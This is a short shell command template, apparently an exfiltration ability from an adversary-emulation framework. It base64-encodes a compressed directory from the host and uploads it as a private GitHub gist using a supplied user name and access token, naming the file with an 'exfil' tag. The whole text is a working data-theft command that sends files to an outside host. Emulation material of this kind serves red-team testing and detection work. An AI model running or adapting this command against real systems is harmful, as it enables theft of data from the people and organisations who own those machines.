GHUser="#{github.user.name}";
GHPAT="#{github.access.token}";
FileContent=$(base64 #{host.dir.compress});
LocalFile='#{host.dir.compress}';
RemoteFile="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)";
tmp_file=$(mktemp);
echo "{\"public\": false,\"files\": {\"$RemoteFile\": {\"content\": \"${FileContent}\"}}}" > $tmp_file;
curl --silent --output /dev/null --show-error --fail -X POST -d @$tmp_file -u $GHUser:$GHPAT https://api.github.com/gists;
rm $tmp_file
